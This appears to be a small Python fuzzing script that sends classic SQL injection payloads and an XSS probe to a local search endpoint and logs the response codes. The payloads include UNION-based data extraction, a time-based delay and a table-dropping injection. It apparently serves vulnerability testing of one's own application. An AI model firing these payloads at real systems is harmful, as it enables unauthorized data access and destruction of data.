import requests
import time
import urllib.parse

# --- CONFIGURATION ---
TARGET_URL = "http://localhost:5000/search"

# --- THE PAYLOADS (The "Bad" Data) ---
# These are classic strings used to test for vulnerabilities
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT 1, database(), user() --",
    "<script>alert(1)</script>",  # XSS attempt (Bonus!)
    "Waitfor delay '0:0:5'",      # Time-based SQLi
    "@@version",
    "'; DROP TABLE logs; --"      # The "Nuclear Option"
]

print(f"🚀 Starting Fuzzing Attack against {TARGET_URL}...\n")

for i, payload in enumerate(payloads):
    # We must URL-encode the payload (e.g., spaces become %20)
    # properly so the server receives it correctly.
    encoded_payload = urllib.parse.quote(payload)
    
    full_url = f"{TARGET_URL}?q={encoded_payload}"
    
    try:
        # Fire the weapon
        response = requests.get(full_url)
        
        print(f"[{i+1}] 💣 Fired Payload: {payload}")
        print(f"      └── Status: {response.status_code}")
        
    except Exception as e:
        print(f"❌ Error: {e}")

    time.sleep(0.5) # Pace it slightly

print("\n✅ Fuzzing Complete.")